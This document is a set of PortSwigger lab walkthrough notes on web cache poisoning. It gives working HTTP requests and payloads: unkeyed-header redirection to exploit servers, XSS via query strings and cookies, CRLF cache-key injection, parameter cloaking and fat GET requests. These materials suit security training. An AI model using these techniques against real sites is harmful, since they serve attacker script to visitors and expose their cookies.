---
description: https://portswigger.net/web-security/web-cache-poisoning
---

# Web cache poisoning

### Lab: Web cache poisoning with an unkeyed header

This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. A user visits the home page roughly once every minute. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

```
GET /?cb=123 HTTP/1.1
...
X-Forwarded-Host: test

In response:
Cache-Control: max-age=30
Age: 0
X-Cache: miss
       <script type="text/javascript" src="//test/resources/js/tracking.js">
```

If we repeat the request, we can see this in response header:

```
Cache-Control: max-age=30
Age: 15
X-Cache: hit
```

30 seconds to reset cache.

**Exploit Server ->**

```
File:
	/resources/js/tracking.js
Body:
	alert(document.cookie)
```

**Solution:**

```
GET / HTTP/1.1
...
X-Forwarded-Host: exploit-ac6c1f561f6c1240c03440c7017d0033.web-security-academy.net

In response:
X-Cache: miss
<script type="text/javascript" src="//exploit-ac6c1f561f6c1240c03440c7017d0033.web-security-academy.net/resources/js/tracking.js">
```

If we visit the page with another browser, the script will be executed. The cache expires every 30 seconds.

### Lab: Web cache poisoning with an unkeyed cookie

This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes alert(1) in the visitor's browser.

```
GET /?cb=123 HTTP/1.1
Cookie: session=OvSzN7yFPNqTkWU3gr3irfw6Q2dIX6xp; fehost=prod-cache-01

In the response:
<script>
data = {
    "host":"ac4b1f491f0d03c1c0449f4e003e0077.web-security-academy.net",
    "path":"/",
    "frontend":"prod-cache-01"
}
</script>
```

```
GET /?cb=123 HTTP/1.1
Cookie: session=OvSzN7yFPNqTkWU3gr3irfw6Q2dIX6xp; fehost=test

In response:
"frontend":"test"
```

**Solution:**

```
prod-cache-01"-alert(1)-"

GET / HTTP/1.1
Cookie: session=OvSzN7yFPNqTkWU3gr3irfw6Q2dIX6xp; fehost=prod-cache-01"-alert(1)-"

In response:
"frontend":"prod-cache-01"-alert(1)-""
```

### Lab: Web cache poisoning with multiple headers

This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

****[**https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Proto**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Proto)****

```
GET /resources/js/tracking.js HTTP/1.1
...
X-Forwarded-Host: test1
X-Forwarded-Scheme: http

In the response:
HTTP/1.1 302 Found
Location: https://test1/resources/js/tracking.js
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Connection: close
Content-Length: 0
```

**Exploit Server ->**

```
File:
	/resources/js/tracking.js
Body:
	<script>alert(document.cookie)</script>
```

**Solution:**

```
GET /resources/js/tracking.js HTTP/1.1
...
X-Forwarded-Host: exploit-ac1d1f7a1f1e66dcc0b693c401c60019.web-security-academy.net
X-Forwarded-Scheme: http

In response:
HTTP/1.1 302 Found
Location: https://exploit-ac1d1f7a1f1e66dcc0b693c401c60019.web-security-academy.net/resources/js/tracking.js
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Connection: close
Content-Length: 0
```

### Lab: Targeted web cache poisoning using an unknown header

This lab is vulnerable to web cache poisoning. A user visits the home page roughly once a minute. The user also views any comments you post. To solve this lab, you need to poison the cache with a response that executes alert(document.cookie) in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.

```
GET / HTTP/1.1

In the response headers:

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Vary: User-Agent
Cache-Control: max-age=30
Age: 19
X-Cache: hit
Connection: close
Content-Length: 7670
```

Burp Extension -> Param Miner&#x20;

GET / HTTP/1.1 -> Extensions -> Param Miner -> Guess params -> Guess headers

Issue Activity -> Web cache poisoning -> **X-Host** header

```
GET /?cb=123 HTTP/1.1
...
X-Host: test

In response:
       <script type="text/javascript" src="//test/resources/js/tracking.js"></script>
```

**Exploit Server ->**

```
File:
	/resources/js/tracking.js
Body:
	alert(document.cookie)
```

```
GET / HTTP/1.1
...
X-Host: exploit-aca71f7a1e5618f4c083175201fb001e.web-security-academy.net
```

This way is not working. "Vary: User Agent" is the key. We need to identify user's User Agent.

```
GET /post?postId=8 HTTP/1.1

In response:
Comment:
HTML is allowed

Post this as comment:
<img src="https://exploit-aca71f7a1e5618f4c083175201fb001e.web-security-academy.net/foo"></img>
```

**Exploit Server -> Access Log**

`"GET /foo HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"`

**Solution:**

```
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
X-Host: exploit-aca71f7a1e5618f4c083175201fb001e.web-security-academy.net
```

### Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

This lab contains a DOM-based vulnerability that can be exploited as part of a web cache poisoning attack. A user visits the home page roughly once a minute. Note that the cache used by this lab has stricter criteria for deciding which responses are cacheable, so you will need to study the cache behavior closely.

To solve the lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

GET / HTTP/1.1 -> Burp Extension -> Param Miner -> Guess params -> Guess headers

Issue Activity -> Web cache poisoning -> **X-Forwarded-Host** header

```
GET /?cb=123 HTTP/1.1
...
X-Forwarded-Host: test

In response:
<script>
    data = {
        "host":"test",
        "path":"/",
    }
</script>
```

```
GET /?cb=123 HTTP/1.1
...
X-Forwarded-Host: exploit-ac261fcb1e3ee5b4c042011801e70028.web-security-academy.net
```

**Exploit Server -> Access Log**

`"GET /resources/json/geolocate.json HTTP/1.1" 404`

```
GET /resources/json/geolocate.json HTTP/1.1

The response:
{
    "country": "United Kingdom"
}

GET /resources/js/geolocate.js HTTP/1.1

In the response:
           div.innerHTML = 'Free shipping to ' + j.country;
```

**Exploit Server ->**

```
File:
	/resources/json/geolocate.json
Head:
	Access-Control-Allow-Origin: *
Body:
	{"country":"<img src=1 onerror=alert(document.cookie) />"}
```

**Solution:**

```
GET / HTTP/1.1
...
X-Forwarded-Host: exploit-ac261fcb1e3ee5b4c042011801e70028.web-security-academy.net
```

### Lab: Combining web cache poisoning vulnerabilities

This lab is susceptible to web cache poisoning, but only if you construct a complex exploit chain.

A user visits the home page roughly once a minute and their language is set to English. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

GET / HTTP/1.1 -> Burp Extension -> Param Miner -> Guess params -> Guess headers

Issue Activity -> Web cache poisoning -> **X-Forwarded-Host** and **X-Original-URL** headers

```
GET / HTTP/1.1

In the response:
<script>
	initTranslations('//' + data.host + '/resources/json/translations.json');
</script>

GET /?cb=123 HTTP/1.1
...
X-Forwarded-Host: test

In the response:
<script>
	data = {
		"host":"test",
		"path":"/",
	}
</script>
```

```
GET /?cb=123 HTTP/1.1
...
X-Forwarded-Host: exploit-ac711f901e4b183bc0052db20125002b.web-security-academy.net
```

**Exploit Server -> Access Log**

`"GET /resources/json/translations.json HTTP/1.1" 404`

```
GET /resources/json/translations.json HTTP/1.1

{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "Ver detailes",
            "Description:": "Descripción:"
        }
    }, ...
```

If we choose the language, the value will add lang cookie.

`Cookie: session=gImZNUEhoU9aIQQRhG0K4MF5sdgbcK33; lang=es`

**Exploit Server ->**

```
File:
	/resources/json/translations.json
Head:
	Access-Control-Allow-Origin: *
Body:
    {
        "en": {
            "name": "English"
        },
        "es": {
            "name": "español",
            "translations": {
                "Return to list": "Volver a la lista",
                "View details": "</a><img src=1 onerror='alert(document.cookie)'  />",
                "Description:": "Descripción:"
            }
        }
    }
```

**Solution chain:**

```
GET /setlang/es/ HTTP/1.1
...
X-Original-URL: /setlang\es

GET /?localized=1 HTTP/1.1
...
X-Forwarded-Host: exploit-ac711f901e4b183bc0052db20125002b.web-security-academy.net

GET / HTTP/1.1
...
X-Forwarded-Host: exploit-ac711f901e4b183bc0052db20125002b.web-security-academy.net
```

### Lab: Web cache poisoning via an unkeyed query string

This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the home page with a response that executes alert(1) in the victim's browser.

`GET /?cb=1234 HTTP/1.1` - Not working.

GET / HTTP/1.1 -> Burp Extension -> Param Miner -> Guess params -> Guess headers

Issue Activity -> Web cache poisoning -> **Origin** header

```
GET /?cb=123 HTTP/1.1
...
Origin: cachebuster
Pragma: x-get-cache-key

In response:
X-Cache-Key: /$$Origin=cachebuster
...
<link rel="canonical" href='//ac931f151f6a7990c00a403200310061.web-security-academy.net/?cb=123'/>
```

**Solution:**

```
GET /?evil='/><script>alert(1)</script> HTTP/1.1
```

### Lab: Web cache poisoning via an unkeyed query parameter

This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser.

GET / HTTP/1.1 -> Burp Extension -> Param Miner -> Guess params -> Guess everything!

Issue Activity -> Web cache poisoning -> **Origin** header, **utm\_content** query parameter

```
GET /?utm_content=cachebuster HTTP/1.1

In the response:
Set-Cookie: utm_content=cachebuster; Secure; HttpOnly
...
<link rel="canonical" href='//ac261faa1f4e6c70c05c33ef00140035.web-security-academy.net/?utm_content=cachebuster&nih12ueki4=1'/>
```

**Solution:**

```
GET /?utm_content='/><script>alert(1)</script> HTTP/1.1

In response:
Set-Cookie: utm_content=%27%2f%3e%3cscript%3ealert%281%29%3c%2fscript%3e
...
<link rel="canonical" href='//ac261faa1f4e6c70c05c33ef00140035.web-security-academy.net/?utm_content='/><script>alert(1)</script>&n9n5p1=1'/>
```

### Lab: Parameter cloaking

This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site's home page using Chrome.

To solve the lab, use the parameter cloaking technique to poison the cache with a response that executes alert(1) in the victim's browser.

Manual testing: utm\_content parameter enabled but not effect caching

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=evil;callback=evilone HTTP/1.1

In the response:
Set-Cookie: utm_content=evil; Secure; HttpOnly
...
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
evilone({"country":"United Kingdom"});
```

**Solution:**

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=evil;callback=alert(1) HTTP/1.1
```

### Lab: Web cache poisoning via a fat GET request

This lab is vulnerable to web cache poisoning. It accepts GET requests that have a body, but does not include the body in the cache key. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser.

```
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
...
callback=evilone

In the response:
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
evilone({"country":"United Kingdom"});
```

**Solution:**

```
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
...
callback=alert(1)
```

### Lab: URL normalization

This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.

To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute alert(1) in the victim's browser. Then, deliver the malicious URL to the victim.

```
GET /test HTTP/1.1

In the response:
<p>Not Found: /test</p>
```

**Solution:**

```
GET /random</p><script>alert(1)</script><p>foo HTTP/1.1
---
https://ac331f211f8e8ebec0a1107e0004005a.web-security-academy.net/random</p><script>alert(1)</script><p>foo
```

### Lab: Cache key injection

This lab contains multiple independent vulnerabilities, including cache key injection. A user regularly visits this site's home page using Chrome.

To solve the lab, combine the vulnerabilities to execute alert(1) in the victim's browser. Note that you will need to make use of the Pragma: x-get-cache-key header in order to solve this lab.

**Solution:**

```
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/1.1
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$

Decoded:
-----
Origin: x
Content-Length: 8

alert(1)$$$$
-----

GET /login?lang=en?utm_content=x%26cors=1%26x=1$$Origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/1.1

Decoded:
-----
/login?lang=en?utm_content=x&cors=1&x=1$$Origin=x
Content-Length: 8

alert(1)$$#
-----
```

### Lab: Internal cache poisoning

This lab is vulnerable to web cache poisoning. It uses multiple layers of caching. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the internal cache so that the home page executes alert(document.cookie) in the victim's browser.

```
GET /?cb=123 HTTP/1.1
Host: ac4f1ffd1e28702fc1321234002b009e.web-security-academy.net
X-Forwarded-Host: exploit-acc11fdd1e707021c102127b01160029.web-security-academy.net
```

Send it constantly, because, timing is the key. We should see exploit server url in the response 3 times.

**Exploit Server ->**

```
File:
	/js/geolocate.js
Body:
	alert(document.cookie)
```
